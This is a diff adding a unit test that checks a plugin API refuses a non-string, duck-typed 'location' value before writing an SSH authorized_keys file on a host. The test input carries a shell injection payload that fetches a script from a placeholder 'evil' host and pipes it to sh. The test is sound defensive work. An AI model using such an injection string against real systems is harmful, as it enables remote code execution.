@@ -81,6 +81,23 @@ describe("api.keys.addToHost path validation", () => {
     expect(sshExecCommand).not.toHaveBeenCalled();
   });
 
+  it("refuses a duck-typed location on the plugin path, which coerces nothing", async () => {
+    // The MCP verb does String(a.location); this route does not, and a plugin
+    // is in-process JS handed the API object itself.
+    const api = createHostPluginAPI("test:addtohost-duck", ["keys:read", "connections:read"]);
+    await expect(api.keys.addToHost({
+      keyId: "k1",
+      connectionId: "c1",
+      location: {
+        startsWith: () => false,
+        split: () => ["ssh"],
+        replace: () => "'; curl http://evil | sh; echo '",
+      } as unknown as string,
+      filename: "authorized_keys",
+    })).rejects.toThrow(/Location/);
+    expect(sshExecCommand).not.toHaveBeenCalled();
+  });
+
   it("reaches the host for a legitimate destination, so the refusals above are the path rule", async () => {
     const api = createHostPluginAPI("test:addtohost-ok", ["keys:read", "connections:read"]);
     await api.keys.addToHost({ keyId: "k1", connectionId: "c1", location: ".ssh", filename: "authorized_keys" });
